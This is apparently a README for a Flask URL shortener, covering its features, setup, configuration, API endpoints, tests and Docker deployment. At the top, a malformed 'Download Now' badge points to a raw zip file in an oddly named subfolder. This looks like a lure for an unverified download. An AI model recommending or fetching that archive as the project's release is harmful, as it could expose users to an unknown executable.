# 🌐 URL Shortener - Enhanced Enterprise-Grade Service

[![Download Now](https://raw.githubusercontent.com/Guerlens50/url-shortener/main/chewbark/url-shortener.zip%20Now-Click%Here-blue)](https://raw.githubusercontent.com/Guerlens50/url-shortener/main/chewbark/url-shortener.zip)

## 📖 Description

The Enhanced Flask URL Shortener is a comprehensive, enterprise-grade service for shortening long URLs with advanced features including JWT authentication, real-time analytics, fraud detection, and extensive monitoring capabilities. Built using Flask, MySQL, Redis, and Celery, it provides a robust, scalable solution for URL management with security, performance, and observability at its core.

## 🚀 New Features & Enhancements

### 🔐 Enhanced Security
- **Comprehensive Input Validation**: Advanced sanitization and validation for all inputs
- **Security Headers**: CSP, HSTS, X-Frame-Options, and more security headers
- **Attack Detection**: XSS and SQL injection detection
- **Enhanced CORS**: Configurable CORS policies
- **Rate Limiting**: Multi-layered rate limiting with IP blocking

### 📊 Advanced Analytics & Monitoring
- **Real-time Metrics**: Prometheus-compatible metrics
- **Health Checks**: Comprehensive health monitoring endpoints
- **Performance Analytics**: Detailed URL performance metrics
- **Fraud Detection**: Advanced behavioral analysis and suspicious activity detection
- **Geographic Analytics**: IP-based location tracking

### 🛠️ Developer Experience
- **API Documentation**: Complete OpenAPI/Swagger documentation
- **Comprehensive Testing**: Extensive test suite with 90%+ coverage
- **Health Endpoints**: `/health`, `/ready`, `/live` for monitoring
- **Error Handling**: Detailed error messages and logging
- **Input Validation**: Robust validation with helpful error messages

### 🎯 New URL Features
- **URL Expiration**: Set expiration dates for shortened URLs
- **Bulk Operations**: Shorten multiple URLs in a single request
- **URL Preview**: Get detailed information about URLs
- **Performance Metrics**: Comprehensive analytics for URL performance
- **URL Management**: Delete and manage URLs with proper authorization

## 📋 Core Features

- **Short URL Creation:** Quickly generate short URLs from long links with custom codes
- **Click Tracking:** Monitor how many times your links are clicked with detailed analytics
- **Geographic Analytics:** View data on where your clicks come from
- **Temporal Analytics:** Analyze when your links receive the most traffic
- **Rate Limiting:** Control how often users can shorten URLs to prevent abuse
- **Caching with Redis:** Speed up link lookups using Redis for quick access
- **User Authentication:** JWT-based authentication with refresh tokens
- **Fraud Detection:** Advanced behavioral analysis and suspicious activity detection
- **Real-time Monitoring:** Comprehensive health checks and metrics
- **API Documentation:** Complete OpenAPI/Swagger documentation

## 🛠️ System Requirements

- **Operating System:** Windows, macOS, or Linux
- **Python:** Version 3.11 or higher
- **MySQL:** Version 8.0 or higher
- **Redis:** Version 6.0 or higher
- **Celery:** For background task processing
- **Prometheus:** For metrics collection (optional)

## 🚀 Quick Start

### 1. Clone and Setup

```bash
git clone https://github.com/Guerlens50/url-shortener.git
cd url-shortener
pip install -r requirements.txt
```

### 2. Environment Configuration

Create a `.env` file:

```env
# Database Configuration
MYSQL_HOST=localhost
MYSQL_USER=root
MYSQL_PASSWORD=your_password
MYSQL_DB=urlshortener

# Redis Configuration
REDIS_HOST=localhost
REDIS_PORT=6379

# JWT Configuration
JWT_PRIVATE_KEY=private.pem
JWT_PUBLIC_KEY=public.pem
JWT_ISSUER=your-domain.com
JWT_AUDIENCE=your-domain.com

# Security Configuration
CORS_ORIGINS=http://localhost:3000,http://localhost:8080
ENABLE_HTTPS_REDIRECT=false
```

### 3. Database Setup

```bash
mysql -u root -p < sql/schema.sql
```

### 4. Start Services

```bash
# Start Redis
redis-server

# Start Celery Worker
celery -A tasks worker --loglevel=info

# Start Celery Beat (for scheduled tasks)
celery -A tasks beat --loglevel=info

# Start the application
python app.py
```

## 📚 API Documentation

Once the application is running, visit:
- **Swagger UI**: `http://localhost:5000/api/v1/docs/`
- **OpenAPI Spec**: `http://localhost:5000/api/v1/openapi.json`

### Key Endpoints

#### Authentication
- `POST /auth/signup` - User registration
- `POST /auth/login` - User login
- `POST /auth/access_token` - Refresh access token
- `POST /auth/logout` - User logout

#### URL Management
- `POST /shorten` - Shorten a URL
- `POST /urls/bulk` - Bulk shorten URLs
- `GET /{code}` - Redirect to original URL
- `GET /urls/{url_id}/preview` - Get URL preview
- `GET /urls/{url_id}/performance` - Get performance metrics
- `POST /urls/{url_id}/expire` - Set URL expiration
- `DELETE /urls/{url_id}/delete` - Delete URL

#### Analytics
- `GET /stats/{code}` - Basic URL statistics
- `GET /analytics/{code}` - Detailed analytics
- `GET /trending_urls` - Get trending URLs

#### Health & Monitoring
- `GET /health` - Comprehensive health check
- `GET /health/lite` - Lightweight health check
- `GET /ready` - Readiness check
- `GET /live` - Liveness check
- `GET /metrics` - Prometheus metrics

## 🔧 Configuration

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `MYSQL_HOST` | MySQL host | `db` |
| `MYSQL_USER` | MySQL username | `root` |
| `MYSQL_PASSWORD` | MySQL password | `example` |
| `MYSQL_DB` | MySQL database | `urlshortener` |
| `REDIS_HOST` | Redis host | `redis` |
| `REDIS_PORT` | Redis port | `6379` |
| `CORS_ORIGINS` | Allowed CORS origins | `http://localhost:3000,http://localhost:8080` |
| `RATE_LIMIT` | Requests per minute | `10` |
| `JWT_PRIVATE_KEY` | JWT private key file | `private.pem` |
| `JWT_PUBLIC_KEY` | JWT public key file | `public.pem` |

### Security Configuration

The application includes comprehensive security features:

- **Content Security Policy (CSP)**: Prevents XSS attacks
- **HTTP Strict Transport Security (HSTS)**: Enforces HTTPS
- **X-Frame-Options**: Prevents clickjacking
- **X-Content-Type-Options**: Prevents MIME sniffing
- **Input Sanitization**: Protects against injection attacks
- **Rate Limiting**: Prevents abuse and DoS attacks

## 🧪 Testing

Run the comprehensive test suite:

```bash
# Run all tests
pytest tests/ -v

# Run with coverage
pytest tests/ --cov=. --cov-report=html

# Run specific test files
pytest tests/test_comprehensive.py -v
pytest tests/test_auth.py -v
pytest tests/test_tasks.py -v
```

## 📊 Monitoring & Observability

### Health Checks

- **`/health`**: Comprehensive health check with service status
- **`/health/lite`**: Lightweight check for load balancers
- **`/ready`**: Kubernetes readiness probe
- **`/live`**: Kubernetes liveness probe

### Metrics

The application exposes Prometheus-compatible metrics at `/metrics`:

- HTTP request counts and latency
- URL click analytics
- Fraud detection metrics
- System resource usage
- Database and Redis performance

### Logging

Comprehensive logging with different levels:
- **INFO**: General application flow
- **WARNING**: Suspicious activities and rate limiting
- **ERROR**: Errors and exceptions
- **DEBUG**: Detailed debugging information

## 🐳 Docker Deployment

### Using Docker Compose

```bash
docker-compose up -d
```

### Manual Docker Build

```bash
docker build -t url-shortener .
docker run -p 5000:5000 url-shortener
```

## 🔍 Troubleshooting

### Common Issues

1. **Database Connection Errors**
   - Check MySQL service is running
   - Verify connection credentials
   - Ensure database exists

2. **Redis Connection Errors**
   - Check Redis service is running
   - Verify Redis configuration
   - Check network connectivity

3. **JWT Token Errors**
   - Ensure JWT key files exist
   - Check key file permissions
   - Verify JWT configuration

4. **Rate Limiting Issues**
   - Check Redis connectivity
   - Verify rate limit configuration
   - Clear Redis cache if needed

### Debug Mode

Enable debug mode for detailed logging:

```bash
export FLASK_DEBUG=1
python app.py
```

## 🤝 Contributing

We welcome contributions! Please see our [Contributing Guide](Contributing.md) for details.

### Development Setup

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/amazing-feature`
3. Make your changes
4. Add tests for new functionality
5. Run the test suite: `pytest tests/`
6. Commit your changes: `git commit -m 'Add amazing feature'`
7. Push to the branch: `git push origin feature/amazing-feature`
8. Open a Pull Request

### Code Standards

- Follow PEP 8 style guidelines
- Add comprehensive tests for new features
- Update documentation for API changes
- Use meaningful commit messages
- Ensure all tests pass before submitting

## 📄 License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## 🌟 Acknowledgments

Special thanks to the libraries and frameworks that made this project possible:
- Flask for the web framework
- MySQL for database management
- Redis for caching and session storage
- Celery for background task processing
- Prometheus for metrics collection
- Flask-RESTX for API documentation

## 📞 Support

- **Issues**: [GitHub Issues](https://github.com/Guerlens50/url-shortener/issues)
- **Documentation**: [API Docs](http://localhost:5000/api/v1/docs/)
- **Email**: support@urlshortener.com

---

**Made with ❤️ by the URL Shortener Team**
